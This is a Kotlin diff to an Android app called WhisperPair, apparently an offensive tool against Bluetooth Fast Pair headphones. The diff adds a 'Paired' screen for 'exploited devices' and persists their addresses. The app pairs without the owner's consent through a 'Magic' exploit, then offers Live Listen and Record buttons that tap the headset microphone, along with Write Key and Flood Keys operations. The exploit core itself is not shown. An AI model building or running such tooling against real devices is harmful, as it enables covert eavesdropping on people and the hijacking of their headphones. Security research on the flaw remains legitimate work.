@@ -77,18 +77,23 @@ class MainActivity : ComponentActivity() {
     private val pairedDevices = mutableStateListOf<String>()  // Track successfully paired devices
     private var hasShownFirstFailWarning = false
     private val showUnpairWarning = mutableStateOf(false)
+    private val showHfpErrorDialog = mutableStateOf(false)
 
     data class AudioConnectionState(
         val isConnected: Boolean = false,
         val isRecording: Boolean = false,
         val isListening: Boolean = false,
         val recordingFile: String? = null,
-        val message: String? = null
+        val message: String? = null,
+        val hasHfpError: Boolean = false
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
+
+        // Load saved paired devices
+        loadPairedDevices()
 
         val bluetoothManager = getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
         val bluetoothAdapter = bluetoothManager?.adapter
@@ -100,6 +105,7 @@ class MainActivity : ComponentActivity() {
         audioManager?.initialize { ready ->
             if (ready) {
                 android.util.Log.d("WhisperPair", "Audio manager initialized")
+                checkExistingHfpConnections()
             }
         }
 
@@ -129,9 +135,11 @@ class MainActivity : ComponentActivity() {
                         pairedDevices = pairedDevices,
                         showUnpairWarning = showUnpairWarning.value,
                         onDismissUnpairWarning = { showUnpairWarning.value = false },
+                        showHfpErrorDialog = showHfpErrorDialog.value,
+                        onDismissHfpErrorDialog = { showHfpErrorDialog.value = false },
                         recordingsDir = getExternalFilesDir(null) ?: filesDir,
-                        onScanToggle = { isScanning ->
-                            if (isScanning) scanner?.startScanning() else scanner?.stopScanning()
+                        onScanToggle = { isScanning, showAll ->
+                            if (isScanning) scanner?.startScanning(showAll) else scanner?.stopScanning()
                         },
                         onTestDevice = { device -> testDevice(device) },
                         onClearDevices = {
@@ -146,7 +154,8 @@ class MainActivity : ComponentActivity() {
                         onStartRecording = { device -> startRecording(device) },
                         onStopRecording = { device -> stopRecording(device) },
                         onStartListening = { device -> startListening(device) },
-                        onStopListening = { device -> stopListening(device) }
+                        onStopListening = { device -> stopListening(device) },
+                        onCheckConnections = { checkExistingHfpConnections() }
                     )
                 }
             }
@@ -174,30 +183,71 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    private fun exploitDevice(device: FastPairDevice) {
-        exploitResults[device.address] = "Connecting..."
-
-        exploit?.exploit(device.address) { result ->
-            runOnUiThread {
-                when (result) {
-                    is FastPairExploit.ExploitResult.Success -> {
-                        exploitResults[device.address] = "PAIRED! BR/EDR: ${result.brEdrAddress}"
-                        if (!pairedDevices.contains(device.address)) pairedDevices.add(device.address)
-                    }
-                    is FastPairExploit.ExploitResult.PartialSuccess -> {
-                        exploitResults[device.address] = "PARTIAL: ${result.brEdrAddress} - ${result.message}"
-                        if (!pairedDevices.contains(device.address)) pairedDevices.add(device.address)
-                    }
-                    is FastPairExploit.ExploitResult.Failed -> {
-                        exploitResults[device.address] = "FAILED: ${result.reason}"
-                    }
-                    is FastPairExploit.ExploitResult.AccountKeyResult -> {
-                        exploitResults[device.address] = if (result.success) "KEY: ${result.message}" else "FAILED: ${result.message}"
-                    }
-                    else -> {}
-                }
+    private fun checkExistingHfpConnections() {
+        val am = audioManager ?: return
+        val connectedDevices = am.getConnectedDevices()
+        for (btDevice in connectedDevices) {
+            val address = btDevice.address
+            if (pairedDevices.contains(address)) {
+                audioStates[address] = AudioConnectionState(
+                    isConnected = true,
+                    message = "HFP connected"
+                )
             }
         }
+    }
+
+    private fun loadPairedDevices() {
+        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        val saved = prefs.getStringSet(KEY_PAIRED_DEVICES, emptySet()) ?: emptySet()
+        pairedDevices.clear()
+        pairedDevices.addAll(saved)
+    }
+
+    private fun savePairedDevices() {
+        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        prefs.edit().putStringSet(KEY_PAIRED_DEVICES, pairedDevices.toSet()).apply()
+    }
+
+    private fun addPairedDevice(address: String) {
+        if (!pairedDevices.contains(address)) {
+            pairedDevices.add(address)
+            savePairedDevices()
+        }
+    }
+
+    private fun exploitDevice(device: FastPairDevice) {
+        exploitResults[device.address] = "Initializing..."
+
+        exploit?.exploit(
+            targetAddress = device.address,
+            onProgress = { progress ->
+                runOnUiThread {
+                    exploitResults[device.address] = progress
+                }
+            },
+            onResult = { result ->
+                runOnUiThread {
+                    when (result) {
+                        is FastPairExploit.ExploitResult.Success -> {
+                            exploitResults[device.address] = "PAIRED! BR/EDR: ${result.brEdrAddress}"
+                            addPairedDevice(device.address)
+                        }
+                        is FastPairExploit.ExploitResult.PartialSuccess -> {
+                            exploitResults[device.address] = "PARTIAL: ${result.brEdrAddress} - ${result.message}"
+                            addPairedDevice(device.address)
+                        }
+                        is FastPairExploit.ExploitResult.Failed -> {
+                            exploitResults[device.address] = "FAILED: ${result.reason}"
+                        }
+                        is FastPairExploit.ExploitResult.AccountKeyResult -> {
+                            exploitResults[device.address] = if (result.success) "KEY: ${result.message}" else "FAILED: ${result.message}"
+                        }
+                        else -> {}
+                    }
+                }
+            }
+        )
     }
 
     private fun writeAccountKey(device: FastPairDevice) {
@@ -242,7 +292,17 @@ class MainActivity : ComponentActivity() {
                         )
                     }
                     is BluetoothAudioManager.AudioState.Error -> {
-                        audioStates[device.address] = AudioConnectionState(message = "HFP: ${state.message}")
+                        val userMessage = when (state.message) {
+                            "HFP_PERMISSION_DENIED" -> "Manual connection required"
+                            "HFP_MANUAL_REQUIRED" -> "Manual connection required"
+                            "HFP_TIMEOUT" -> "Connection timed out"
+                            else -> state.message
+                        }
+                        audioStates[device.address] = AudioConnectionState(
+                            message = userMessage,
+                            hasHfpError = true
+                        )
+                        showHfpErrorDialog.value = true
                     }
                     else -> {}
                 }
@@ -339,10 +399,11 @@ class MainActivity : ComponentActivity() {
     }
 }
 
-enum class Screen { Scanner, Recordings }
+enum class Screen { Scanner, Paired, Recordings }
 
 private const val PREFS_NAME = "whisperpair_prefs"
 private const val KEY_DISCLAIMER_ACCEPTED = "disclaimer_accepted"
+private const val KEY_PAIRED_DEVICES = "paired_devices"
 
 @OptIn(ExperimentalMaterial3Api::class)
 @Composable
@@ -354,8 +415,10 @@ fun WhisperPairApp(
     pairedDevices: List<String>,
     showUnpairWarning: Boolean,
     onDismissUnpairWarning: () -> Unit,
+    showHfpErrorDialog: Boolean,
+    onDismissHfpErrorDialog: () -> Unit,
     recordingsDir: File,
-    onScanToggle: (Boolean) -> Unit,
+    onScanToggle: (Boolean, Boolean) -> Unit,
     onTestDevice: (FastPairDevice) -> Unit,
     onClearDevices: () -> Unit,
     onExploitDevice: (FastPairDevice) -> Unit,
@@ -365,12 +428,17 @@ fun WhisperPairApp(
     onStartRecording: (FastPairDevice) -> Unit,
     onStopRecording: (FastPairDevice) -> Unit,
     onStartListening: (FastPairDevice) -> Unit,
-    onStopListening: (FastPairDevice) -> Unit
+    onStopListening: (FastPairDevice) -> Unit,
+    onCheckConnections: () -> Unit
 ) {
     val prefs = remember { context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE) }
     var currentScreen by remember { mutableStateOf(Screen.Scanner) }
     var showAboutDialog by remember { mutableStateOf(false) }
     var showDisclaimerDialog by remember { mutableStateOf(!prefs.getBoolean(KEY_DISCLAIMER_ACCEPTED, false)) }
+
+    // Scanner state - lifted up to persist across tab switches
+    var isScanning by remember { mutableStateOf(false) }
+    var showAllDevices by remember { mutableStateOf(false) }  // Default to Fast Pair only
 
     Scaffold(
         bottomBar = {
@@ -380,6 +448,25 @@ fun WhisperPairApp(
                     onClick = { currentScreen = Screen.Scanner },
                     icon = { Icon(Icons.Default.BluetoothSearching, contentDescription = null) },
                     label = { Text("Scanner") },
+                    colors = NavigationBarItemDefaults.colors(
+                        selectedIconColor = CyanPrimary,
+                        selectedTextColor = CyanPrimary,
+                        indicatorColor = CyanPrimary.copy(alpha = 0.2f)
+                    )
+                )
+                NavigationBarItem(
+                    selected = currentScreen == Screen.Paired,
+                    onClick = { currentScreen = Screen.Paired },
+                    icon = {
+                        BadgedBox(badge = {
+                            if (pairedDevices.isNotEmpty()) {
+                                Badge(containerColor = VulnerableRed) { Text("${pairedDevices.size}") }
+                            }
+                        }) {
+                            Icon(Icons.Default.Headphones, contentDescription = null)
+                        }
+                    },
+                    label = { Text("Paired") },
                     colors = NavigationBarItemDefaults.colors(
                         selectedIconColor = CyanPrimary,
                         selectedTextColor = CyanPrimary,
@@ -405,21 +492,31 @@ fun WhisperPairApp(
             Screen.Scanner -> ScannerScreen(
                 devices = devices,
                 exploitResults = exploitResults,
-                audioStates = audioStates,
-                pairedDevices = pairedDevices,
                 paddingValues = paddingValues,
+                isScanning = isScanning,
+                showAllDevices = showAllDevices,
+                onScanningChange = { isScanning = it },
+                onShowAllDevicesChange = { showAllDevices = it },
                 onScanToggle = onScanToggle,
                 onTestDevice = onTestDevice,
                 onClearDevices = onClearDevices,
                 onExploitDevice = onExploitDevice,
-                onWriteAccountKey = onWriteAccountKey,
-                onFloodKeys = onFloodKeys,
+                onShowAbout = { showAboutDialog = true }
+            )
+            Screen.Paired -> PairedDevicesScreen(
+                context = context,
+                devices = devices.filter { pairedDevices.contains(it.address) },
+                audioStates = audioStates,
+                exploitResults = exploitResults,
+                paddingValues = paddingValues,
                 onConnectHfp = onConnectHfp,
                 onStartRecording = onStartRecording,
                 onStopRecording = onStopRecording,
                 onStartListening = onStartListening,
                 onStopListening = onStopListening,
-                onShowAbout = { showAboutDialog = true }
+                onWriteAccountKey = onWriteAccountKey,
+                onFloodKeys = onFloodKeys,
+                onCheckConnections = onCheckConnections
             )
             Screen.Recordings -> RecordingsScreen(
                 recordingsDir = recordingsDir,
@@ -442,6 +539,48 @@ fun WhisperPairApp(
     if (showUnpairWarning) {
         UnpairWarningDialog(onDismiss = onDismissUnpairWarning)
     }
+
+    if (showHfpErrorDialog) {
+        HfpErrorDialog(context = context, onDismiss = onDismissHfpErrorDialog)
+    }
+}
+
+@Composable
+fun HfpErrorDialog(context: Context, onDismiss: () -> Unit) {
+    AlertDialog(
+        onDismissRequest = onDismiss,
+        icon = { Icon(Icons.Default.HeadsetOff, null, tint = WarningOrange, modifier = Modifier.size(48.dp)) },
+        title = { Text("Manual Connection Required", textAlign = TextAlign.Center, fontWeight = FontWeight.Bold) },
+        text = {
+            Column {
+                Text("Android restricts direct audio profile connections for non-system apps. You need to connect manually through settings.", style = MaterialTheme.typography.bodyMedium)
+                Spacer(Modifier.height(12.dp))
+                Text("Steps:", style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.SemiBold, color = CyanPrimary)
+                Spacer(Modifier.height(8.dp))
+                Text("1. Open Bluetooth settings", style = MaterialTheme.typography.bodySmall)
+                Text("2. Find the paired device in the list", style = MaterialTheme.typography.bodySmall)
+                Text("3. Tap on it to connect the audio profile", style = MaterialTheme.typography.bodySmall)
+                Text("4. Return here - audio controls will be available", style = MaterialTheme.typography.bodySmall)
+                Spacer(Modifier.height(12.dp))
+                Text("The device is already paired via exploit. Once you manually connect audio in settings, the app can access the microphone.", style = MaterialTheme.typography.labelSmall, color = TextSecondary)
+            }
+        },
+        confirmButton = {
+            Button(
+                onClick = {
+                    onDismiss()
+                    context.startActivity(Intent(Settings.ACTION_BLUETOOTH_SETTINGS))
+                },
+                colors = ButtonDefaults.buttonColors(containerColor = CyanPrimary)
+            ) {
+                Icon(Icons.Default.Bluetooth, null, Modifier.size(18.dp))
+                Spacer(Modifier.width(8.dp))
+                Text("Open Bluetooth Settings")
+            }
+        },
+        dismissButton = { TextButton(onClick = onDismiss) { Text("Later", color = TextSecondary) } },
+        containerColor = DarkSurface
+    )
 }
 
 @Composable
@@ -477,23 +616,17 @@ fun UnpairWarningDialog(onDismiss: () -> Unit) {
 fun ScannerScreen(
     devices: List<FastPairDevice>,
     exploitResults: Map<String, String>,
-    audioStates: Map<String, MainActivity.AudioConnectionState>,
-    pairedDevices: List<String>,
     paddingValues: PaddingValues,
-    onScanToggle: (Boolean) -> Unit,
+    isScanning: Boolean,
+    showAllDevices: Boolean,
+    onScanningChange: (Boolean) -> Unit,
+    onShowAllDevicesChange: (Boolean) -> Unit,
+    onScanToggle: (Boolean, Boolean) -> Unit,
     onTestDevice: (FastPairDevice) -> Unit,
     onClearDevices: () -> Unit,
     onExploitDevice: (FastPairDevice) -> Unit,
-    onWriteAccountKey: (FastPairDevice) -> Unit,
-    onFloodKeys: (FastPairDevice) -> Unit,
-    onConnectHfp: (FastPairDevice) -> Unit,
-    onStartRecording: (FastPairDevice) -> Unit,
-    onStopRecording: (FastPairDevice) -> Unit,
-    onStartListening: (FastPairDevice) -> Unit,
-    onStopListening: (FastPairDevice) -> Unit,
     onShowAbout: () -> Unit
 ) {
-    var isScanning by remember { mutableStateOf(false) }
     var showPermissionDeniedDialog by remember { mutableStateOf(false) }
     var showBluetoothDisabledDialog by remember { mutableStateOf(false) }
     val context = LocalContext.current
@@ -511,20 +644,20 @@ fun ScannerScreen(
 
     val permissionLauncher = rememberLauncherForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { results ->
         if (results.all { it.value }) {
-            if (isBluetoothEnabled()) { isScanning = true; onScanToggle(true) }
+            if (isBluetoothEnabled()) { onScanningChange(true); onScanToggle(true, showAllDevices) }
             else showBluetoothDisabledDialog = true
         } else showPermissionDeniedDialog = true
     }
 
     val bluetoothEnableLauncher = rememberLauncherForActivityResult(ActivityResultContracts.StartActivityForResult()) {
-        if (isBluetoothEnabled()) { isScanning = true; onScanToggle(true) }
+        if (isBluetoothEnabled()) { onScanningChange(true); onScanToggle(true, showAllDevices) }
     }
 
     fun startScan() {
         when {
             !hasAllPermissions() -> permissionLauncher.launch(permissions)
             !isBluetoothEnabled() -> showBluetoothDisabledDialog = true
-            else -> { isScanning = true; onScanToggle(true) }
+            else -> { onScanningChange(true); onScanToggle(true, showAllDevices) }
         }
     }
 
@@ -549,23 +682,81 @@ fun ScannerScreen(
         }
 
         ScanControlCard(isScanning = isScanning, deviceCount = devices.size, onToggleScan = {
-            if (!isScanning) startScan() else { isScanning = false; onScanToggle(false) }
+            if (!isScanning) startScan() else { onScanningChange(false); onScanToggle(false, showAllDevices) }
         })
 
-        Spacer(Modifier.height(16.dp))
+        Spacer(Modifier.height(8.dp))
 
-        if (devices.isNotEmpty()) {
-            OutlinedButton(onClick = onClearDevices, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.outlinedButtonColors(contentColor = TextSecondary)) {
-                Icon(Icons.Default.Clear, null, Modifier.size(18.dp))
-                Spacer(Modifier.width(4.dp))
-                Text("Clear All Devices")
+        // Filter chips row
+        Row(
+            modifier = Modifier
+                .fillMaxWidth()
+                .clip(RoundedCornerShape(12.dp))
+                .background(DarkSurface)
+                .padding(4.dp),
+            horizontalArrangement = Arrangement.spacedBy(0.dp)
+        ) {
+            // Fast Pair Only chip
+            Box(
+                modifier = Modifier
+                    .weight(1f)
+                    .clip(RoundedCornerShape(8.dp))
+                    .background(if (!showAllDevices) CyanPrimary else Color.Transparent)
+                    .clickable {
+                        if (showAllDevices) {
+                            onShowAllDevicesChange(false)
+                            onClearDevices()
+                            if (isScanning) onScanToggle(true, false)
+                        }
+                    }
+                    .padding(vertical = 10.dp),
+                contentAlignment = Alignment.Center
+            ) {
+                Text(
+                    "Fast Pair",
+                    fontSize = 13.sp,
+                    fontWeight = if (!showAllDevices) FontWeight.SemiBold else FontWeight.Normal,
+                    color = if (!showAllDevices) DarkBackground else TextSecondary
+                )
             }
-            Spacer(Modifier.height(16.dp))
+            // All BLE Devices chip
+            Box(
+                modifier = Modifier
+                    .weight(1f)
+                    .clip(RoundedCornerShape(8.dp))
+                    .background(if (showAllDevices) CyanPrimary else Color.Transparent)
+                    .clickable {
+                        if (!showAllDevices) {
+                            onShowAllDevicesChange(true)
+                            onClearDevices()
+                            if (isScanning) onScanToggle(true, true)
+                        }
+                    }
+                    .padding(vertical = 10.dp),
+                contentAlignment = Alignment.Center
+            ) {
+                Text(
+                    "All BLE",
+                    fontSize = 13.sp,
+                    fontWeight = if (showAllDevices) FontWeight.SemiBold else FontWeight.Normal,
+                    color = if (showAllDevices) DarkBackground else TextSecondary
+                )
+            }
         }
+
+        Spacer(Modifier.height(12.dp))
 
         Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
             Text("Discovered Devices", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.SemiBold, color = TextPrimary)
-            if (devices.isNotEmpty()) Text("${devices.size} found", style = MaterialTheme.typography.bodySmall, color = TextSecondary)
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                if (devices.isNotEmpty()) {
+                    Text("${devices.size} found", style = MaterialTheme.typography.bodySmall, color = TextSecondary)
+                    Spacer(Modifier.width(8.dp))
+                    IconButton(onClick = onClearDevices, modifier = Modifier.size(24.dp)) {
+                        Icon(Icons.Default.Clear, null, Modifier.size(16.dp), tint = TextSecondary)
+                    }
+                }
+            }
         }
 
         Spacer(Modifier.height(8.dp))
@@ -578,17 +769,8 @@ fun ScannerScreen(
                     DeviceCard(
                         device = device,
                         exploitResult = exploitResults[device.address],
-                        audioState = audioStates[device.address],
-                        isPaired = pairedDevices.contains(device.address),
                         onTest = { onTestDevice(device) },
-                        onExploit = { onExploitDevice(device) },
-                        onWriteAccountKey = { onWriteAccountKey(device) },
-                        onFloodKeys = { onFloodKeys(device) },
-                        onConnectHfp = { onConnectHfp(device) },
-                        onStartRecording = { onStartRecording(device) },
-                        onStopRecording = { onStopRecording(device) },
-                        onStartListening = { onStartListening(device) },
-                        onStopListening = { onStopListening(device) }
+                        onExploit = { onExploitDevice(device) }
                     )
                 }
                 item { Spacer(Modifier.height(8.dp)) }
@@ -630,6 +812,388 @@ fun ScannerScreen(
             dismissButton = { TextButton(onClick = { showBluetoothDisabledDialog = false }) { Text("Cancel", color = TextSecondary) } },
             containerColor = DarkSurface
         )
+    }
+}
+
+@Composable
+fun PairedDevicesScreen(
+    context: Context,
+    devices: List<FastPairDevice>,
+    audioStates: Map<String, MainActivity.AudioConnectionState>,
+    exploitResults: Map<String, String>,
+    paddingValues: PaddingValues,
+    onConnectHfp: (FastPairDevice) -> Unit,
+    onStartRecording: (FastPairDevice) -> Unit,
+    onStopRecording: (FastPairDevice) -> Unit,
+    onStartListening: (FastPairDevice) -> Unit,
+    onStopListening: (FastPairDevice) -> Unit,
+    onWriteAccountKey: (FastPairDevice) -> Unit,
+    onFloodKeys: (FastPairDevice) -> Unit,
+    onCheckConnections: () -> Unit
+) {
+    // Check for existing HFP connections when screen is shown
+    LaunchedEffect(Unit) {
+        onCheckConnections()
+    }
+
+    Column(
+        modifier = Modifier
+            .fillMaxSize()
+            .padding(paddingValues)
+            .padding(horizontal = 16.dp)
+    ) {
+        Spacer(Modifier.height(12.dp))
+
+        Row(
+            modifier = Modifier.fillMaxWidth(),
+            verticalAlignment = Alignment.CenterVertically
+        ) {
+            Icon(Icons.Default.Headphones, null, tint = CyanPrimary, modifier = Modifier.size(28.dp))
+            Spacer(Modifier.width(12.dp))
+            Column {
+                Text("Paired Devices", fontWeight = FontWeight.Bold, fontSize = 20.sp, color = TextPrimary)
+                Text("Manage exploited devices", fontSize = 12.sp, color = TextSecondary)
+            }
+        }
+
+        Spacer(Modifier.height(16.dp))
+
+        if (devices.isEmpty()) {
+            Box(
+                modifier = Modifier.fillMaxSize(),
+                contentAlignment = Alignment.Center
+            ) {
+                Card(
+                    modifier = Modifier.fillMaxWidth(),
+                    colors = CardDefaults.cardColors(containerColor = DarkSurface),
+                    shape = RoundedCornerShape(16.dp)
+                ) {
+                    Column(
+                        modifier = Modifier.padding(24.dp),
+                        horizontalAlignment = Alignment.CenterHorizontally
+                    ) {
+                        Icon(
+                            Icons.Default.BluetoothDisabled,
+                            null,
+                            tint = TextSecondary,
+                            modifier = Modifier.size(64.dp)
+                        )
+                        Spacer(Modifier.height(16.dp))
+                        Text(
+                            "No Paired Devices",
+                            style = MaterialTheme.typography.titleMedium,
+                            fontWeight = FontWeight.SemiBold,
+                            color = TextPrimary
+                        )
+                        Spacer(Modifier.height(8.dp))
+                        Text(
+                            "Devices you successfully pair using the Magic exploit will appear here.",
+                            style = MaterialTheme.typography.bodyMedium,
+                            color = TextSecondary,
+                            textAlign = TextAlign.Center
+                        )
+                        Spacer(Modifier.height(16.dp))
+                        Text(
+                            "Go to Scanner tab → Find a vulnerable device → Tap Magic",
+                            style = MaterialTheme.typography.labelMedium,
+                            color = CyanPrimary,
+                            textAlign = TextAlign.Center
+                        )
+                    }
+                }
+            }
+        } else {
+            LazyColumn(
+                verticalArrangement = Arrangement.spacedBy(12.dp),
+                modifier = Modifier.weight(1f)
+            ) {
+                items(devices) { device ->
+                    PairedDeviceCard(
+                        context = context,
+                        device = device,
+                        audioState = audioStates[device.address],
+                        exploitResult = exploitResults[device.address],
+                        onConnectHfp = { onConnectHfp(device) },
+                        onStartRecording = { onStartRecording(device) },
+                        onStopRecording = { onStopRecording(device) },
+                        onStartListening = { onStartListening(device) },
+                        onStopListening = { onStopListening(device) },
+                        onWriteAccountKey = { onWriteAccountKey(device) },
+                        onFloodKeys = { onFloodKeys(device) }
+                    )
+                }
+                item { Spacer(Modifier.height(8.dp)) }
+            }
+        }
+    }
+}
+
+@Composable
+fun PairedDeviceCard(
+    context: Context,
+    device: FastPairDevice,
+    audioState: MainActivity.AudioConnectionState?,
+    exploitResult: String?,
+    onConnectHfp: () -> Unit,
+    onStartRecording: () -> Unit,
+    onStopRecording: () -> Unit,
+    onStartListening: () -> Unit,
+    onStopListening: () -> Unit,
+    onWriteAccountKey: () -> Unit,
+    onFloodKeys: () -> Unit
+) {
+    val isHfpConnected = audioState?.isConnected == true
+    val isRecording = audioState?.isRecording == true
+    val isListening = audioState?.isListening == true
+
+    Card(
+        modifier = Modifier.fillMaxWidth(),
+        colors = CardDefaults.cardColors(containerColor = DarkSurface),
+        shape = RoundedCornerShape(16.dp)
+    ) {
+        Column(modifier = Modifier.padding(16.dp)) {
+            // Device header
+            Row(
+                modifier = Modifier.fillMaxWidth(),
+                horizontalArrangement = Arrangement.SpaceBetween,
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
+                    Box(
+                        modifier = Modifier
+                            .size(48.dp)
+                            .clip(CircleShape)
+                            .background(if (isHfpConnected) PatchedGreen.copy(alpha = 0.2f) else CyanPrimary.copy(alpha = 0.15f)),
+                        contentAlignment = Alignment.Center
+                    ) {
+                        Icon(
+                            Icons.Default.Headphones,
+                            null,
+                            tint = if (isHfpConnected) PatchedGreen else CyanPrimary,
+                            modifier = Modifier.size(26.dp)
+                        )
+                    }
+                    Spacer(Modifier.width(12.dp))
+                    Column {
+                        Text(
+                            device.displayName,
+                            style = MaterialTheme.typography.titleMedium,
+                            fontWeight = FontWeight.SemiBold,
+                            color = TextPrimary,
+                            maxLines = 1,
+                            overflow = TextOverflow.Ellipsis
+                        )
+                        device.manufacturer?.let {
+                            Text(it, style = MaterialTheme.typography.bodySmall, color = TextSecondary)
+                        }
+                        Text(
+                            device.address,
+                            style = MaterialTheme.typography.labelSmall,
+                            color = TextTertiary,
+                            fontFamily = FontFamily.Monospace
+                        )
+                    }
+                }
+                Surface(
+                    color = if (isHfpConnected) PatchedGreen.copy(alpha = 0.2f) else WarningOrange.copy(alpha = 0.2f),
+                    shape = RoundedCornerShape(8.dp)
+                ) {
+                    Text(
+                        if (isHfpConnected) "Connected" else "Disconnected",
+                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
+                        style = MaterialTheme.typography.labelSmall,
+                        fontWeight = FontWeight.SemiBold,
+                        color = if (isHfpConnected) PatchedGreen else WarningOrange
+                    )
+                }
+            }
+
+            Spacer(Modifier.height(16.dp))
+
+            // Status message
+            audioState?.message?.let { message ->
+                Row(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .clip(RoundedCornerShape(8.dp))
+                        .background(DarkSurfaceVariant)
+                        .padding(10.dp),
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    Icon(
+                        when {
+                            isRecording -> Icons.Default.FiberManualRecord
+                            isListening -> Icons.Default.Hearing
+                            isHfpConnected -> Icons.Default.CheckCircle
+                            else -> Icons.Default.Info
+                        },
+                        null,
+                        tint = when {
+                            isRecording -> VulnerableRed
+                            isListening -> CyanPrimary
+                            isHfpConnected -> PatchedGreen
+                            else -> TextSecondary
+                        },
+                        modifier = Modifier.size(16.dp)
+                    )
+                    Spacer(Modifier.width(8.dp))
+                    Text(
+                        message,
+                        style = MaterialTheme.typography.bodySmall,
+                        color = TextPrimary
+                    )
+                }
+                Spacer(Modifier.height(12.dp))
+            }
+
+            if (isHfpConnected) {
+                // Audio Controls
+                Text("Audio Controls", style = MaterialTheme.typography.labelMedium, color = TextSecondary)
+                Spacer(Modifier.height(8.dp))
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.spacedBy(8.dp)
+                ) {
+                    // Live Listen Button
+                    Button(
+                        onClick = { if (isListening) onStopListening() else onStartListening() },
+                        colors = ButtonDefaults.buttonColors(
+                            containerColor = if (isListening) VulnerableRed else CyanPrimary
+                        ),
+                        modifier = Modifier.weight(1f),
+                        shape = RoundedCornerShape(12.dp)
+                    ) {
+                        Icon(
+                            if (isListening) Icons.Default.Stop else Icons.Default.Hearing,
+                            null,
+                            Modifier.size(18.dp)
+                        )
+                        Spacer(Modifier.width(6.dp))
+                        Text(if (isListening) "Stop Live" else "Live Listen")
+                    }
+
+                    // Record Button
+                    Button(
+                        onClick = { if (isRecording) onStopRecording() else onStartRecording() },
+                        colors = ButtonDefaults.buttonColors(
+                            containerColor = if (isRecording) VulnerableRed else DarkSurfaceVariant
+                        ),
+                        modifier = Modifier.weight(1f),
+                        shape = RoundedCornerShape(12.dp)
+                    ) {
+                        Icon(
+                            if (isRecording) Icons.Default.Stop else Icons.Default.FiberManualRecord,
+                            null,
+                            tint = if (isRecording) Color.White else VulnerableRed,
+                            modifier = Modifier.size(18.dp)
+                        )
+                        Spacer(Modifier.width(6.dp))
+                        Text(
+                            if (isRecording) "Stop Rec" else "Record",
+                            color = if (isRecording) Color.White else TextPrimary
+                        )
+                    }
+                }
+
+                Spacer(Modifier.height(12.dp))
+
+                // Account Key Controls
+                Text("Account Key Operations", style = MaterialTheme.typography.labelMedium, color = TextSecondary)
+                Spacer(Modifier.height(8.dp))
+
+                // Key operation result/progress display
+                exploitResult?.let { result ->
+                    val bgColor = when {
+                        result.startsWith("KEY") || result.startsWith("FLOOD") -> PatchedGreen
+                        result.startsWith("FAILED") -> VulnerableRed
+                        else -> CyanPrimary
+                    }
+                    Row(
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .clip(RoundedCornerShape(8.dp))
+                            .background(bgColor.copy(alpha = 0.15f))
+                            .padding(10.dp),
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Icon(
+                            when {
+                                result.startsWith("KEY") || result.startsWith("FLOOD") -> Icons.Default.CheckCircle
+                                result.startsWith("FAILED") -> Icons.Default.Error
+                                else -> Icons.Default.Sync
+                            },
+                            null,
+                            tint = bgColor,
+                            modifier = Modifier.size(16.dp)
+                        )
+                        Spacer(Modifier.width(8.dp))
+                        Text(
+                            result,
+                            style = MaterialTheme.typography.labelSmall,
+                            color = TextPrimary,
+                            maxLines = 2,
+                            overflow = TextOverflow.Ellipsis
+                        )
+                    }
+                    Spacer(Modifier.height(8.dp))
+                }
+
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.spacedBy(8.dp)
+                ) {
+                    OutlinedButton(
+                        onClick = onWriteAccountKey,
+                        modifier = Modifier.weight(1f),
+                        shape = RoundedCornerShape(12.dp),
+                        colors = ButtonDefaults.outlinedButtonColors(contentColor = CyanPrimary)
+                    ) {
+                        Icon(Icons.Default.Key, null, Modifier.size(16.dp))
+                        Spacer(Modifier.width(4.dp))
+                        Text("Write Key", fontSize = 12.sp)
+                    }
+                    OutlinedButton(
+                        onClick = onFloodKeys,
+                        modifier = Modifier.weight(1f),
+                        shape = RoundedCornerShape(12.dp),
+                        colors = ButtonDefaults.outlinedButtonColors(contentColor = WarningOrange)
+                    ) {
+                        Icon(Icons.Default.FlashOn, null, Modifier.size(16.dp))
+                        Spacer(Modifier.width(4.dp))
+                        Text("Flood Keys", fontSize = 12.sp)
+                    }
+                }
+            } else {
+                // Not connected - show connect buttons only
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.spacedBy(8.dp)
+                ) {
+                    Button(
+                        onClick = onConnectHfp,
+                        modifier = Modifier.weight(1f),
+                        colors = ButtonDefaults.buttonColors(containerColor = CyanPrimary),
+                        shape = RoundedCornerShape(12.dp)
+                    ) {
+                        Icon(Icons.Default.BluetoothConnected, null, Modifier.size(18.dp))
+                        Spacer(Modifier.width(6.dp))
+                        Text("Connect Audio")
+                    }
+                    OutlinedButton(
+                        onClick = {
+                            context.startActivity(Intent(Settings.ACTION_BLUETOOTH_SETTINGS))
+                        },
+                        modifier = Modifier.weight(1f),
+                        shape = RoundedCornerShape(12.dp),
+                        colors = ButtonDefaults.outlinedButtonColors(contentColor = TextSecondary)
+                    ) {
+                        Icon(Icons.Default.Settings, null, Modifier.size(18.dp))
+                        Spacer(Modifier.width(6.dp))
+                        Text("Settings")
+                    }
+                }
+            }
+        }
     }
 }
 
@@ -827,17 +1391,8 @@ fun ScanControlCard(isScanning: Boolean, deviceCount: Int, onToggleScan: () -> U
 fun DeviceCard(
     device: FastPairDevice,
     exploitResult: String?,
-    audioState: MainActivity.AudioConnectionState?,
-    isPaired: Boolean,
